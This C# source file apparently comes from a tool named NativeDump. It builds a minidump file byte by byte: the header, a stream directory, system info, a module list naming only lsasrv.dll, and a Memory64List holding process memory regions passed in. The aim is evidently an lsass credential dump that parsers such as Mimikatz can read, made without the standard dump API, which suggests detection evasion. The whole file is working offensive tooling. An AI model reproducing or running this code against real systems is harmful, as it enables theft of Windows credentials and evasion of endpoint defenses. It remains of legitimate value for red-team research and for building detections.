using System;
using System.IO;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static NativeDump.Win32;
using System.Linq;


namespace NativeDump
{
    internal class CreateFile
    {
        public static byte[] JoinByteArrays(params byte[][] arrays)
        {
            return arrays.SelectMany(array => array).ToArray();
        }


        public static byte[] StructToByteArray<T>(T structInstance) where T : struct
        {
            int structSize = Marshal.SizeOf(structInstance);
            byte[] byteArray = new byte[structSize];
            IntPtr ptr = Marshal.AllocHGlobal(structSize);
            Marshal.StructureToPtr(structInstance, ptr, true);
            Marshal.Copy(ptr, byteArray, 0, structSize);
            Marshal.FreeHGlobal(ptr);
            return byteArray;
        }

        
        public static void CreateMinidump(IntPtr lsasrvdll_address, int lsasrvdll_size, List<Memory64Info> mem64info_List, byte[] memoryRegions_byte_arr, string dumpfile)
        {            
            // Header
            /*
            string buff = "";
            // Header
            buff += "4D444D50"; // Signature
            buff += "93A7"; // Version
            buff += "0000";
            buff += "03000000"; // NumberOfStreams
            buff += "20000000"; // StreamDirectoryRVA
            buff += "00000000";
            buff += "0000000000000000";
            buff += "00000000";
            */
            MinidumpHeader header = new MinidumpHeader();
            header.Signature = 0x504d444d;
            header.Version = 0xa793;
            header.ImplementationVersion = 0x0;
            header.NumberOfStreams = 0x3;
            header.StreamDirectoryRva = 0x20;
            header.CheckSum = 0x0;
            header.TimeDateStamp = IntPtr.Zero;
            

            // Stream Directory
            /*
            buff += "04000000" + "70000000" + "7C000000";
            buff += "07000000" + "38000000" + "44000000";
            buff += "09000000" + M64Size_DataDirectory + "30010000"; // Address = 32 + 36 + 56 + 4 + 108 + 4 + 4 (+2)
            */
            MinidumpStreamDirectoryEntry minidumpStreamDirectoryEntry_1 = new MinidumpStreamDirectoryEntry();
            minidumpStreamDirectoryEntry_1.StreamType = 4;
            minidumpStreamDirectoryEntry_1.Size = 112;
            minidumpStreamDirectoryEntry_1.Location = 0x7c;
            MinidumpStreamDirectoryEntry minidumpStreamDirectoryEntry_2 = new MinidumpStreamDirectoryEntry();
            minidumpStreamDirectoryEntry_2.StreamType = 7;
            minidumpStreamDirectoryEntry_2.Size = 56;
            minidumpStreamDirectoryEntry_2.Location = 0x44;
            MinidumpStreamDirectoryEntry minidumpStreamDirectoryEntry_3 = new MinidumpStreamDirectoryEntry();
            minidumpStreamDirectoryEntry_3.StreamType = 9;
            minidumpStreamDirectoryEntry_3.Size = (uint)(16 + 16 * mem64info_List.Count);
            minidumpStreamDirectoryEntry_3.Location = 0x0130;
            

            // SystemInfoStream
            /*
            string systeminfostream = "0900";
            systeminfostream += "0000";
            systeminfostream += "0000";
            systeminfostream += "00";
            systeminfostream += "00";
            systeminfostream += "0A000000"; // Major Version
            systeminfostream += "00000000";
            systeminfostream += "654a0000";
            systeminfostream += "00000000";
            systeminfostream += "00000000";
            systeminfostream += "00000000";
            systeminfostream += "0000000000000000";
            systeminfostream += "0000000000000000";
            systeminfostream += "00000000";
            systeminfostream += "00000000";
            buff += systeminfostream;
            */
            SystemInfoStream systemInfoStream = new SystemInfoStream();
            systemInfoStream.ProcessorArchitecture = 0x9;
            systemInfoStream.ProcessorLevel = 0;
            systemInfoStream.ProcessorRevision = 0;
            systemInfoStream.NumberOfProcessors = 0;
            systemInfoStream.ProductType = 0;
            systemInfoStream.MajorVersion = 0xA;
            systemInfoStream.MinorVersion = 0x0;
            systemInfoStream.BuildNumber = 0x4a65;
            systemInfoStream.PlatformId = 0;
            systemInfoStream.uint_unknown1 = 0;
            systemInfoStream.uint_unknown2 = 0;
            systemInfoStream.ProcessorFeatures = IntPtr.Zero;
            systemInfoStream.ProcessorFeatures2 = IntPtr.Zero;
            systemInfoStream.uint_unknown3 = 0;
            systemInfoStream.ushort_unknown4 = 0;
            systemInfoStream.byte_unknown5 = 0;
            

            // ModuleList
            /*
            string modulelist = "01000000";
            modulelist += LsasrvDll_Address; // "00000837FF7F0000";
            modulelist += "00301a00";
            modulelist += "0000000000000000";
            modulelist += "EC000000"; // 
            modulelist += "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"; // ¿80 o 84?
            modulelist += "00000000";
            buff += modulelist;
            */
            ModuleListStream moduleListStream = new ModuleListStream();
            moduleListStream.NumberOfModules = 1;
            ModuleInfo moduleInfo = new ModuleInfo();
            moduleInfo.BaseAddress = lsasrvdll_address;
            moduleInfo.Size = (uint)lsasrvdll_size; //0x1a3000;
            moduleInfo.PointerName = 0xEC;
            // ModuleList - Padding
            Padding padding = new Padding();
            // ModuleList - Unicode string
            /*
            string unicode_string = "3C000000";
            unicode_string += "43003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C006C00730061007300720076002E0064006C006C000000";
            unicode_string += "0000"; // Para pasar a 0x130, si no hay que ir a 0x12E
            buff += unicode_string;
            */
            UnicodeString unicodeString = new UnicodeString();
            string dll_name = "C:\\Windows\\System32\\lsasrv.dll";
            unicodeString.UnicodeLength = (uint)(dll_name.Length * 2);
            byte[] dll_byte_array = Encoding.Unicode.GetBytes(dll_name); ;
            

            // Memory64List
            /*
            int number_of_entries = (int)mem64info_List.Count;
            int offset_mem_regions = 0x130 + 16 + (16 * number_of_entries);
            string mem64list = "";
            mem64list += IntPtrToString((IntPtr)number_of_entries);
            mem64list += IntPtrToString((IntPtr)offset_mem_regions);
            for (int i = 0; i < mem64info_List.Count; i++)
            {
                mem64list += IntPtrToString(mem64info_List[i].Address);
                mem64list += IntPtrToString(mem64info_List[i].Size);
            }
            buff += mem64list;
            */
            int number_of_entries = mem64info_List.Count;
            int offset_mem_regions = 0x130 + 16 + (16 * number_of_entries);
            Memory64ListStream memory64ListStream = new Memory64ListStream();
            memory64ListStream.NumberOfEntries = (ulong)number_of_entries;
            memory64ListStream.MemoryRegionsBaseAddress = (uint)offset_mem_regions;
            byte[] memory64ListStream_byte_arr = StructToByteArray(memory64ListStream);
            for (int i = 0; i < mem64info_List.Count; i++)
            {
                Memory64Info memory64Info = mem64info_List[i];
                memory64ListStream_byte_arr = JoinByteArrays(memory64ListStream_byte_arr, StructToByteArray(memory64Info));
            }


            // Create Minidump file complete byte array
            /*
            Console.WriteLine(ByteArrayToHexString(header_byte_arr));
            Console.WriteLine(ByteArrayToHexString(streamDirectory_byte_arr));
            Console.WriteLine(ByteArrayToHexString(systemInfoStream_byte_arr));
            Console.WriteLine(ByteArrayToHexString(moduleListStream_byte_arr));
            Console.WriteLine(ByteArrayToHexString(memory64ListStream_byte_arr));
            */
            byte[] header_byte_arr = StructToByteArray(header);
            byte[] streamDirectory_byte_arr = JoinByteArrays(StructToByteArray(minidumpStreamDirectoryEntry_1), StructToByteArray(minidumpStreamDirectoryEntry_2), StructToByteArray(minidumpStreamDirectoryEntry_3));
            byte[] systemInfoStream_byte_arr = StructToByteArray(systemInfoStream);
            byte[] moduleListStream_byte_arr = JoinByteArrays(StructToByteArray(moduleListStream), StructToByteArray(moduleInfo), StructToByteArray(padding), StructToByteArray(unicodeString), dll_byte_array, StructToByteArray(padding));
            byte[] minidumpFile = JoinByteArrays(header_byte_arr, streamDirectory_byte_arr, systemInfoStream_byte_arr, moduleListStream_byte_arr, memory64ListStream_byte_arr, memoryRegions_byte_arr);


            // Save to file
            try
            {
                using (FileStream fs = new FileStream(dumpfile, FileMode.Create))
                {
                    fs.Write(minidumpFile, 0, minidumpFile.Length);
                }
                Console.WriteLine("[+] File " + dumpfile + " created.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] It was not possible to create the file. Exception message: " + ex.Message);
            }
        }
    }
}
